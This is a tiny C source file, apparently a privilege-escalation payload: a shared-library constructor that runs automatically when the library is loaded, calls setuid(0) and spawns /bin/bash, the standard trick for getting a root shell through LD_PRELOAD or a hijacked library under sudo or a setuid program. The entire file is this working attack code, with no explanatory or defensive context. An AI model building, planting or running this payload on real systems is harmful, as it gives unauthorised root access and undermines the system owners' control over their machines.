#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void __attribute__ ((constructor)) init(void) {
 setuid(0);
 system("/bin/bash");
}
